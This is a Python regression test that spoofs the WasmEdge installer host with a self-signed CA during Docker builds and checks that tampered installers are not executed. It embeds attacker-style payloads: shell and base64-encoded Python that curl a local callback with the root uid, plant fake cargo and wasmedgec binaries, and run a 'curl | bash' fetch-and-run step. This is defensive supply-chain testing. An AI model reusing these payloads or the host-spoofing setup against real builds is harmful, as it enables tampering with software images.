#!/usr/bin/env python3
"""Security regressions for the WasmEdge installer invoked by image builds.

These tests fail while a build executes an installer it downloaded from an
unpinned URL. They are expected to fail until the Dockerfiles pin that
installer and verify a checksum of the saved bytes before executing those
same bytes.

Run:

    sudo python3 tests/wasmedge_installer_integrity_test.py

The suite builds wasmedge-mysql-nginx (docker compose build backend) and
wasmedge-kafka-mysql (docker compose build etl). It needs Docker with
BuildKit, the compose plugin, openssl, and permission to bind port 443.
"""

import base64
import hashlib
import http.server
import os
import re
import shutil
import socketserver
import ssl
import subprocess
import sys
import tempfile
import threading
import unittest
import urllib.parse
import urllib.request
import uuid
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
SAMPLES = (
    {
        "name": "wasmedge-mysql-nginx",
        "directory": REPO / "wasmedge-mysql-nginx",
        "service": "backend",
        "image": "demo-microservice",
    },
    {
        "name": "wasmedge-kafka-mysql",
        "directory": REPO / "wasmedge-kafka-mysql",
        "service": "etl",
        "image": "etl-kafka",
    },
)
INSTALLER_HOST = "raw.githubusercontent.com"
MARKER = b"ATTACKER-CONTROLLED-WASM"
URL_RE = re.compile(r"https://[^\s\"'\\]+")
HASH_RE = re.compile(r"\b[a-fA-F0-9]{64}\b")


def _run(cmd, cwd=None, env=None, timeout=300, check=False):
    return subprocess.run(
        cmd,
        cwd=cwd,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=check,
    )


def _docker_env():
    env = os.environ.copy()
    env["DOCKER_BUILDKIT"] = "1"
    return env


def _bridge_gateway():
    result = _run(
        [
            "docker",
            "network",
            "inspect",
            "bridge",
            "-f",
            "{{ (index .IPAM.Config 0).Gateway }}",
        ],
        check=True,
    )
    gateway = result.stdout.strip()
    if not gateway:
        raise RuntimeError("docker bridge gateway is empty")
    return gateway


def _sha256(data):
    return hashlib.sha256(data).hexdigest()


def _fetch(url):
    request = urllib.request.Request(url, headers={"User-Agent": "installer-integrity-test"})
    with urllib.request.urlopen(request, timeout=60) as response:
        return response.read()


def _urls(dockerfile):
    return [url.rstrip(");") for url in URL_RE.findall(dockerfile)]


def _install_sh_urls(dockerfile):
    return [url for url in _urls(dockerfile) if "install.sh" in url]


def _matching_installer_bytes(dockerfile):
    """Return installer bytes whose sha256 is declared in the Dockerfile.

    None means the Dockerfile does not pin a checksum that matches a
    downloaded installer. A mismatch between a declared checksum and every
    installer URL is an error: the check would not describe the file that
    a later command downloads.
    """
    hashes = {value.lower() for value in HASH_RE.findall(dockerfile)}
    urls = _install_sh_urls(dockerfile)
    if not hashes or not urls:
        return None
    downloaded = []
    for url in urls:
        data = _fetch(url)
        digest = _sha256(data)
        downloaded.append((url, digest))
        if digest in hashes:
            return data
    rendered = "\n".join("%s %s" % (digest, url) for url, digest in downloaded)
    raise AssertionError(
        "Dockerfile checksum does not match the installer URL bytes:\n" + rendered
    )


def _still_downloads_installer(dockerfile):
    return "install.sh" in dockerfile and ("curl" in dockerfile or "wget" in dockerfile)


def _entrypoint_path(dockerfile):
    copies = re.findall(r"(?m)^COPY\s+\S.*\s+(\S+)\s*$", dockerfile)
    if not copies:
        raise AssertionError("Dockerfile has no COPY destination")
    return copies[-1]


def _attacker_shell(token, kind, callback):
    # The callback is the first side effect. The planted wasmedgec writes the
    # wasm file that the final stage copies to the image entrypoint.
    return """#!/bin/bash
echo ATTACKER-SCRIPT kind=%(kind)s uid=$(id -u) token=%(token)s
curl -fsS --retry 2 --max-time 10 "%(callback)s?token=%(token)s&kind=%(kind)s&uid=$(id -u)" >/dev/null || true
mkdir -p /root/.wasmedge/bin /usr/local/cargo/bin
cat > /usr/local/cargo/bin/cargo << 'EOF'
#!/bin/bash
name=app
if [ -f Cargo.toml ]; then
  name=$(sed -n 's/^name *= *"\\([^"]*\\)".*/\\1/p' Cargo.toml | head -n 1)
fi
mkdir -p target/wasm32-wasi/release
printf 'cargo-stand-in' > "target/wasm32-wasi/release/${name}.wasm"
exit 0
EOF
cat > /root/.wasmedge/bin/wasmedgec << 'EOF'
#!/bin/bash
out="${!#}"
printf 'ATTACKER-CONTROLLED-WASM %(token)s\\n' > "$out"
exit 0
EOF
chmod +x /usr/local/cargo/bin/cargo /root/.wasmedge/bin/wasmedgec
exit 0
""" % {
        "token": token,
        "kind": kind,
        "callback": callback,
    }


def _attacker_python(token, kind, callback):
    # Execute the same shell payload. base64 keeps the shell text intact when
    # install.sh pipes this program into python.
    encoded = base64.b64encode(_attacker_shell(token, kind, callback).encode()).decode()
    query = "%s?token=%s&kind=%s&uid=" % (callback, token, kind)
    return "\n".join(
        [
            "import base64, os, urllib.request",
            "print('ATTACKER-SCRIPT kind=%%s uid=%%s token=%%s' %% (%r, os.geteuid(), %r))"
            % (kind, token),
            "try:",
            "    urllib.request.urlopen(%r + str(os.geteuid()), timeout=10).read()" % query,
            "except Exception:",
            "    pass",
            "open('/tmp/attacker.sh','wb').write(base64.b64decode(%r))" % encoded,
            "os.chmod('/tmp/attacker.sh', 0o755)",
            "raise SystemExit(os.system('bash /tmp/attacker.sh') >> 8)",
            "",
        ]
    )


class _InstallerServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


class _Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        return

    def do_HEAD(self):
        self._respond(include_body=False)

    def do_GET(self):
        self._respond(include_body=True)

    def _respond(self, include_body):
        path = self.path.split("?", 1)[0]
        status, body = self.server.harness.response_for(path, count_get=include_body)
        if isinstance(body, str):
            body = body.encode()
        self.send_response(status)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        if include_body and body:
            self.wfile.write(body)


class Harness:
    def __init__(self):
        self.lock = threading.Lock()
        self.mode = "tamper-sh"
        self.token = "unset"
        self.callback = ""
        self.checked_sh = None
        self.master_sh = None
        self.requests = []
        self.callbacks = []
        self._counts = {}
        self._servers = []
        self._threads = []
        self.gateway = None
        self.original_rust_id = None
        self.harness_image_id = None

    def start(self):
        self.gateway = _bridge_gateway()
        self._write_certificates()
        self._build_base_image()
        self._start_tls()
        self._start_callback()
        self._preflight()

    def stop(self):
        for server in self._servers:
            threading.Thread(target=server.shutdown, daemon=True).start()
        self._restore_rust_tag()

    def _write_certificates(self):
        self._cert_dir = tempfile.mkdtemp(prefix="installer-ca-")
        ca_key = os.path.join(self._cert_dir, "ca.key")
        ca_crt = os.path.join(self._cert_dir, "ca.crt")
        server_key = os.path.join(self._cert_dir, "server.key")
        server_csr = os.path.join(self._cert_dir, "server.csr")
        server_crt = os.path.join(self._cert_dir, "server.crt")
        ext = os.path.join(self._cert_dir, "ext.cnf")
        _run(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                "-keyout", ca_key, "-out", ca_crt, "-days", "2",
                "-subj", "/CN=installer-integrity-test-ca",
            ],
            check=True,
        )
        _run(
            [
                "openssl", "req", "-newkey", "rsa:2048", "-nodes",
                "-keyout", server_key, "-out", server_csr,
                "-subj", "/CN=%s" % INSTALLER_HOST,
            ],
            check=True,
        )
        Path(ext).write_text(
            "subjectAltName=DNS:%s\nextendedKeyUsage=serverAuth\n" % INSTALLER_HOST
        )
        _run(
            [
                "openssl", "x509", "-req", "-in", server_csr,
                "-CA", ca_crt, "-CAkey", ca_key, "-CAcreateserial",
                "-out", server_crt, "-days", "2", "-extfile", ext,
            ],
            check=True,
        )
        self._server_crt = server_crt
        self._server_key = server_key
        self._ca_crt = ca_crt

    def _build_base_image(self):
        inspected = _run(
            ["docker", "image", "inspect", "rust:1.64", "--format", "{{.Id}}"],
            check=True,
        )
        self.original_rust_id = inspected.stdout.strip()
        _run(["docker", "tag", "rust:1.64", "rust:1.64-installer-test-original"], check=True)
        context = Path(self._cert_dir) / "context"
        context.mkdir()
        shutil.copy(self._ca_crt, context / "test-ca.crt")
        # debian-security currently advertises package versions whose files
        # 404, so the sample's apt-get install never reaches the installer RUN.
        # Dropping that source is limited to this throwaway base image.
        (context / "Dockerfile").write_text(
            "\n".join(
                [
                    "FROM rust:1.64",
                    "RUN sed -i '/debian-security/d;/bullseye-updates/d' /etc/apt/sources.list",
                    "COPY test-ca.crt /usr/local/share/ca-certificates/test-ca.crt",
                    "RUN update-ca-certificates",
                    "",
                ]
            )
        )
        _run(
            ["docker", "build", "-t", "rust:1.64-installer-harness", str(context)],
            check=True,
            timeout=180,
        )
        identity = _run(
            ["docker", "image", "inspect", "rust:1.64-installer-harness", "--format", "{{.Id}}"],
            check=True,
        )
        self.harness_image_id = identity.stdout.strip()
        _run(["docker", "tag", "rust:1.64-installer-harness", "rust:1.64"], check=True)

    def _restore_rust_tag(self):
        if self.original_rust_id:
            _run(["docker", "tag", self.original_rust_id, "rust:1.64"], check=False)

    def _start_tls(self):
        server = _InstallerServer(("0.0.0.0", 443), _Handler)
        server.harness = self
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(self._server_crt, self._server_key)
        server.socket = context.wrap_socket(server.socket, server_side=True)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self._servers.append(server)
        self._threads.append(thread)

    def _start_callback(self):
        outer = self

        class CallbackHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                return

            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                query = urllib.parse.parse_qs(parsed.query)
                event = {
                    "token": (query.get("token") or [""])[0],
                    "kind": (query.get("kind") or [""])[0],
                    "uid": (query.get("uid") or [""])[0],
                }
                with outer.lock:
                    outer.callbacks.append(event)
                body = b"ok"
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        server = _InstallerServer(("0.0.0.0", 0), CallbackHandler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self._servers.append(server)
        port = server.server_address[1]
        self.callback = "http://%s:%s/executed" % (self.gateway, port)

    def configure(self, mode, token, dockerfile):
        checked = _matching_installer_bytes(dockerfile) if mode != "tamper-sh" else None
        master = None
        if mode == "delegate-py" and checked is None:
            urls = _install_sh_urls(dockerfile)
            if not urls:
                raise AssertionError("Dockerfile no longer has an install.sh URL to delegate from")
            master = _fetch(urls[0])
        with self.lock:
            self.mode = mode
            self.token = token
            self.checked_sh = checked
            self.master_sh = master
            self.requests = []
            self.callbacks = []
            self._counts = {}

    def response_for(self, path, count_get):
        with self.lock:
            self.requests.append(path)
            if count_get:
                self._counts[path] = self._counts.get(path, 0) + 1
            count = self._counts.get(path, 0)
            mode = self.mode
            token = self.token
            checked = self.checked_sh
            master = self.master_sh
            callback = self.callback
        if path.endswith("/utils/install.sh"):
            if mode == "tamper-sh":
                return 200, _attacker_shell(token, "install.sh", callback)
            if mode == "delegate-py":
                return 200, checked if checked is not None else master
            if mode == "refetch":
                if checked is not None and count == 1:
                    return 200, checked
                return 200, _attacker_shell(token, "install.sh.fetch%d" % count, callback)
        if path.endswith("/utils/install.py"):
            if mode == "delegate-py":
                return 200, _attacker_python(token, "install.py", callback)
            return 404, b"not the checksum-verified installer\n"
        return 404, b"not found\n"

    def _preflight(self):
        token = "preflight-" + uuid.uuid4().hex
        dockerfile = (SAMPLES[0]["directory"] / "backend" / "Dockerfile").read_text()
        # The order Dockerfile path differs; preflight only needs the URL text.
        if "install.sh" not in dockerfile:
            dockerfile = "RUN curl -sSf https://%s/WasmEdge/WasmEdge/master/utils/install.sh | bash\n" % INSTALLER_HOST
        self.configure("tamper-sh", token, dockerfile)
        result = _run(
            [
                "docker", "run", "--rm",
                "--add-host", "%s:host-gateway" % INSTALLER_HOST,
                "rust:1.64-installer-harness",
                "bash", "-lc",
                "curl -sSf https://%s/WasmEdge/WasmEdge/master/utils/install.sh | bash" % INSTALLER_HOST,
            ],
            timeout=60,
        )
        if token not in result.stdout:
            raise RuntimeError(
                "preflight did not execute the substituted installer\n" + result.stdout[-2000:]
            )
        if "uid=0" not in result.stdout:
            raise RuntimeError("preflight installer did not run as root\n" + result.stdout[-2000:])

    def requested_installer(self):
        with self.lock:
            return any(path.endswith("/utils/install.sh") for path in self.requests)

    def build(self, sample, token):
        dockerfile_path = _dockerfile_for(sample)
        dockerfile = dockerfile_path.read_text()
        override = tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False)
        try:
            override.write(
                "\n".join(
                    [
                        "services:",
                        "  %s:" % sample["service"],
                        "    build:",
                        "      additional_contexts:",
                        "        rust:1.64: docker-image://rust:1.64-installer-harness",
                        "      extra_hosts:",
                        '        - "%s:host-gateway"' % INSTALLER_HOST,
                        "",
                    ]
                )
            )
            override.close()
            project = "installer-%s-%s" % (sample["name"], token[:8])
            try:
                result = _run(
                    [
                        "docker", "compose",
                        "--progress", "plain",
                        "-p", project,
                        "-f", "compose.yml",
                        "-f", override.name,
                        "build",
                        "--no-cache",
                        sample["service"],
                    ],
                    cwd=str(sample["directory"]),
                    env=_docker_env(),
                    timeout=300,
                )
            except subprocess.TimeoutExpired as exc:
                log = exc.stdout or ""
                if isinstance(log, bytes):
                    log = log.decode(errors="replace")

                class _TimedOut:
                    returncode = 124
                    stdout = log

                result = _TimedOut()
        finally:
            os.unlink(override.name)
        entrypoint = None
        if result.returncode == 0:
            entrypoint = _export_path(sample["image"], _entrypoint_path(dockerfile))
        return Outcome(
            sample=sample["name"],
            token=token,
            returncode=result.returncode,
            log=result.stdout,
            entrypoint=entrypoint,
            dockerfile=dockerfile,
            requested=self.requested_installer(),
            image_uses_harness=self.harness_image_id is not None
            and self.harness_image_id.replace("sha256:", "")[:12] in result.stdout
            or self.harness_image_id in result.stdout,
        )


class Outcome:
    def __init__(self, sample, token, returncode, log, entrypoint, dockerfile, requested, image_uses_harness):
        self.sample = sample
        self.token = token
        self.returncode = returncode
        self.log = log
        self.entrypoint = entrypoint
        self.dockerfile = dockerfile
        self.requested = requested
        self.image_uses_harness = image_uses_harness

    @property
    def executed(self):
        if self.token in self.log:
            return True
        if self.entrypoint and (self.token.encode() in self.entrypoint or MARKER in self.entrypoint):
            return True
        return False

    def detail(self):
        snippet = self.entrypoint[:80] if self.entrypoint else b""
        tail = self.log[-2500:]
        return (
            "%s executed an unverified installer (build exit %s, entrypoint %r).\n"
            "The installer must be pinned to a reviewed commit. Save one download, "
            "reject the build when its sha256 does not match, and execute that same "
            "file only after the check. A later fetch of the URL must not be executed. "
            "install.sh on the master branch also pipes utils/install.py from master "
            "into python; checksum that file and invoke the shell installer with "
            "INSTALL_PY_PATH set to the checked file.\n%s"
            % (self.sample, self.returncode, snippet, tail)
        )


def _dockerfile_for(sample):
    if sample["service"] == "backend":
        return sample["directory"] / "backend" / "Dockerfile"
    return sample["directory"] / "etl" / "Dockerfile"


def _export_path(image, inner_path):
    name = "installer-export-%s" % uuid.uuid4().hex[:12]
    created = _run(["docker", "create", "--name", name, image])
    if created.returncode != 0:
        return None
    destination = tempfile.NamedTemporaryFile(delete=False)
    destination.close()
    try:
        copied = _run(["docker", "cp", "%s:%s" % (name, inner_path), destination.name])
        if copied.returncode != 0:
            return None
        return Path(destination.name).read_bytes()
    finally:
        _run(["docker", "rm", "-f", name])
        try:
            os.unlink(destination.name)
        except OSError:
            pass


class InstallerIntegrityTest(unittest.TestCase):
    harness = None

    @classmethod
    def setUpClass(cls):
        if shutil.which("docker") is None or shutil.which("openssl") is None:
            raise unittest.SkipTest("docker and openssl are required")
        cls.harness = Harness()
        cls.harness.start()

    @classmethod
    def tearDownClass(cls):
        if cls.harness is not None:
            cls.harness.stop()

    def _assert_rejected(self, outcome):
        if not outcome.requested and _still_downloads_installer(outcome.dockerfile):
            self.fail(
                "%s did not request the installer URL, so the build never reached curl | bash.\n%s"
                % (outcome.sample, outcome.log[-2500:])
            )
        self.assertFalse(outcome.executed, outcome.detail())
        if outcome.entrypoint is not None:
            self.assertNotIn(MARKER, outcome.entrypoint)
            self.assertNotIn(outcome.token.encode(), outcome.entrypoint)

    def _run_samples(self, mode):
        outcomes = []
        # Sequential so each build sees only its own installer responses.
        for sample in SAMPLES:
            token = mode + "-" + sample["name"] + "-" + uuid.uuid4().hex[:8]
            dockerfile = _dockerfile_for(sample).read_text()
            self.harness.configure(mode, token, dockerfile)
            outcomes.append(self.harness.build(sample, token))
        for outcome in outcomes:
            with self.subTest(sample=outcome.sample):
                self._assert_rejected(outcome)

    def test_tampered_install_sh_is_not_executed(self):
        self._run_samples("tamper-sh")

    def test_delegated_install_py_is_not_executed(self):
        self._run_samples("delegate-py")

    def test_refetched_installer_bytes_are_not_executed(self):
        self._run_samples("refetch")


if __name__ == "__main__":
    if os.geteuid() != 0:
        os.execvp("sudo", ["sudo", "-n", "-E", sys.executable, *sys.argv])
    unittest.main(verbosity=2)
